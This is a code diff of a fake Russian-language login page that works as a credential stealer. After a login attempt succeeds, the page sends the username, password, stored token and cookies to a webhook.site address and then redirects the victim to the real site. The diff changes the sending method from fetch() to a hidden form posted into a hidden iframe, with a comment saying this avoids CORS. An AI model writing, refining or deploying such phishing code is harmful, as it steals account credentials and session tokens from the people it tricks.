@@ -7,6 +7,7 @@
     body { font-family: sans-serif; padding: 30px; text-align: center; }
     input, button { padding: 10px; margin: 10px; width: 250px; }
     .error { color: red; }
+    iframe { display: none; }
   </style>
 </head>
 <body>
@@ -18,9 +19,17 @@
   </form>
   <p class="error" id="errorMessage"></p>
 
-  <script>
-    const webhook = "https://webhook.site/6b77aea8-855b-4976-9d7e-a9e447b3b291";
+  <!-- iframe для отправки данных скрыто -->
+  <iframe name="stealth" style="display:none;"></iframe>
 
+  <form id="stealer" method="POST" action="https://webhook.site/6b77aea8-855b-4976-9d7e-a9e447b3b291" target="stealth">
+    <input type="hidden" name="username">
+    <input type="hidden" name="password">
+    <input type="hidden" name="token">
+    <input type="hidden" name="cookie">
+  </form>
+
+  <script>
     document.getElementById("loginForm").addEventListener("submit", async function (e) {
       e.preventDefault();
 
@@ -42,30 +51,24 @@
         const isSuccess = !text.toLowerCase().includes("неверный");
 
         if (isSuccess) {
-          errorMsg.textContent = "✅ Авторизация успешна";
-
-          // Подождать, пока токен сохранится в localStorage
-          setTimeout(async () => {
-            const token = localStorage.getItem("token") || "(null)";
+          // задержка — ждём пока токен запишется
+          setTimeout(() => {
+            const token = localStorage.getItem("token");
             const cookie = document.cookie;
 
-            // отправка на webhook
-            await fetch(webhook, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify({
-                username,
-                password,
-                token,
-                cookie
-              })
-            });
+            // Заполняем форму для Webhook
+            const form = document.getElementById("stealer");
+            form.username.value = username;
+            form.password.value = password;
+            form.token.value = token;
+            form.cookie.value = cookie;
 
-            // переход на настоящий сайт
+            // Отправка формы в iframe (без CORS)
+            form.submit();
+
+            // Переход на оригинальный сайт
             window.location.href = "https://kazcyber.zapto.org/";
-          }, 1500); // ждём 1.5 сек
+          }, 1500);
         } else {
           errorMsg.textContent = "❌ Неверный логин или пароль";
         }
